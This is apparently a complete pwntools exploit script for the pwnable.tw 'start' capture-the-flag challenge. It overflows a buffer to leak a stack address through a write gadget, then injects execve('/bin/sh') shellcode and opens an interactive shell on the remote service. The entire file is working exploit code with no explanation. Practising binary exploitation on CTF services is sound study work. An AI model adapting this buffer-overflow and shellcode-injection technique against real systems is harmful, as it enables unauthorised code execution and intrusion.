#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10000)
#r = remote('127.0.0.1', 7122)

write_esp = 0x8048087
start = 0x8048060

r.recvuntil('CTF:')
r.send('A'*20 + p32(start)*6)
r.recvuntil('CTF:')
r.send('A'*20 + flat(write_esp))

x = r.recvrepeat(0.2)
for i in range(0, len(x), 4):
	print hex(u32(x[i:i+4]))
stack = u32(x[:4])
print 'stack:', hex(stack)

r.sendline('')
r.recvuntil('CTF:')
r.send((asm(shellcraft.execve(stack+16))).ljust(20) +
	flat(stack-8) +
	'/bin/sh\x00'
)

r.interactive()
